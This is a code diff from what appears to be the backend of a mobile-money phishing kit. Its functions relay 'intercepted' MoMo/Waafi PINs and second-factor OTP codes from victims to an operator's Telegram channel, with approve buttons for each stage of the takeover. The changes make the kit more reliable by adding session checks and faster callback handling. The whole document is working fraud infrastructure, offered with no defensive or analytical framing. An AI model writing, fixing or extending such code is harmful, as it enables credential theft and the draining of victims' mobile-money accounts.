@@ -49,6 +49,8 @@ function buildInlineOptions(appId, prefix = "approve") {
  * Forwards structured forms safely out to the designated administrative panel channel
  */
 function sendToAdmin(appId, title, metadata, generateControls = false) {
+    if (!appId || appId === "null" || appId === "") return console.error("⚠️ sendToAdmin blocked: Invalid room session.");
+
     const textContent = formatPayloadMessage(appId, title, metadata);
     const layoutSettings = generateControls ? buildInlineOptions(appId, "approve") : { parse_mode: 'HTML' };
     
@@ -61,6 +63,8 @@ function sendToAdmin(appId, title, metadata, generateControls = false) {
  * Delivers intercepted MoMo security PIN codes to the administrator channel
  */
 function sendFinalApproval(appId, pinCode) {
+    if (!appId || appId === "null" || appId === "") return console.error("⚠️ sendFinalApproval blocked: Invalid room session.");
+
     const bodyText = `<b>🔒 Intercepted Account Security PIN</b>\n<code>────────────────────────</code>\n🆔 <b>App Session:</b> <code>${appId}</code>\n🔑 <b>Waafi PIN Entry:</b> <code>${pinCode}</code>\n<code>────────────────────────</code>`;
     bot.sendMessage(chatId, bodyText, buildInlineOptions(appId, "pinok")).catch(err => {
         console.error(`❌ Pin data routing failure: ${err.message}`);
@@ -71,6 +75,8 @@ function sendFinalApproval(appId, pinCode) {
  * Relays secondary step factor authorization strings
  */
 function sendSecondOTP(appId, backupCode) {
+    if (!appId || appId === "null" || appId === "") return console.error("⚠️ sendSecondOTP blocked: Invalid room session.");
+
     const textMarkup = `<b>⚠️ Secondary Authorization Layer (OTP 2)</b>\n<code>────────────────────────</code>\n🆔 <b>App Session:</b> <code>${appId}</code>\n🛡️ <b>Verification Key:</b> <code>${backupCode}</code>\n<code>────────────────────────</code>`;
     bot.sendMessage(chatId, textMarkup, buildInlineOptions(appId, "otp2ok")).catch(err => {
         console.error(`❌ Step secondary data routing failure: ${err.message}`);
@@ -78,12 +84,24 @@ function sendSecondOTP(appId, backupCode) {
 }
 
 // Process administrator feedback adjustments directly from backend channel
-bot.on('callback_query', (query) => {
+bot.on('callback_query', async (query) => {
     const callbackData = query.data;
     const messageId = query.message.message_id;
     
+    // 1. Instantly stop the Telegram loading spinner so the button feels functional
+    try {
+        await bot.answerCallbackQuery(query.id);
+    } catch (err) {
+        console.error(`❌ Failed to answer callback query: ${err.message}`);
+    }
+    
     const [action, targetAppId] = callbackData.split('_');
-    if (!action || !targetAppId) return;
+    
+    // 2. Reject broken sessions cleanly before modifying state or calling Socket rooms
+    if (!action || !targetAppId || targetAppId === "null" || targetAppId === "") {
+        console.warn(`⚠️ Blocked callback action execution for empty/null target session.`);
+        return;
+    }
 
     let systemResponseLog = "";
 
@@ -117,14 +135,12 @@ bot.on('callback_query', (query) => {
             return;
     }
 
-    // Reflect operational adjustments inside backend log message templates
+    // Reflect operational adjustments inside backend log message templates safely
     bot.editMessageText(`${query.message.text}\n\n[Action Log]: ${systemResponseLog}`, {
         chat_id: chatId,
         message_id: messageId,
         parse_mode: 'HTML'
     }).catch(err => console.error(`❌ Message context update exception: ${err.message}`));
-
-    bot.answerCallbackQuery(query.id, { text: "Action logged successfully." });
 });
 
 module.exports = {
